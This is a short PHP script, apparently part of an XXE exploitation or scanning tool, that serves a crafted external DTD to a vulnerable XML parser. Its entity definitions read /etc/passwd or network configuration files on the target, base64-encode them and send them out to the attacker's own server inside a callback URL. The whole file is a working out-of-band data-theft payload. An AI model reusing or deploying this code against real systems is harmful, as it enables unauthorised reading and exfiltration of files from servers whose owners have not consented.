<?php
/* RewriteRule "^dtd/([a-z0-9]+)/([0-9]+)/([a-f0-9]+)/([a-z0-9]+)\.dtd$" "/xxe_dtd.php?rand_id=$1&req_id=$2&hex_param=$3&payload=$4" */
$rand_id = isset($_GET["rand_id"]) ? $_GET["rand_id"] : "";
$req_id = isset($_GET["req_id"]) ? $_GET["req_id"] : "";
$hex_param = isset($_GET["hex_param"]) ? $_GET["hex_param"] : "";
$payload = isset($_GET["payload"]) ? $_GET["payload"] : "";
$ip = $_SERVER["REMOTE_ADDR"];

// Even if URL rewriting protects most of the requests we still have to check parameters format
if (strlen($rand_id) != 6) exit();
if (!ctype_alnum($rand_id)) exit();
if (!ctype_digit($req_id)) exit();
if (!ctype_xdigit($hex_param)) exit();

include("functions.php");

$num = -1;
// We must use small files because big one won't be sent
switch($payload) {
	case "windows":
		$filename = "c:/windows/system32/drivers/etc/networks";
		$num = 2;
		break;
	case "linux":
		$filename = "/etc/passwd";
		$num = 1;
		break;
	case "linux2":
		$filename = "/etc/networks";
		$num = 0;
		break;
}

$response  = '<!ENTITY % payload SYSTEM "php://filter/read=convert.base64-encode/resource='.$filename.'">
<!ENTITY % intern "<!ENTITY &#37; trick SYSTEM \''.site_url().'xoxo/'.$rand_id.'/'.$req_id.'/'.$hex_param.'/'.$num.'/%payload;\'>">
';
header("Content-Type: text/xml");
echo $response;
?>
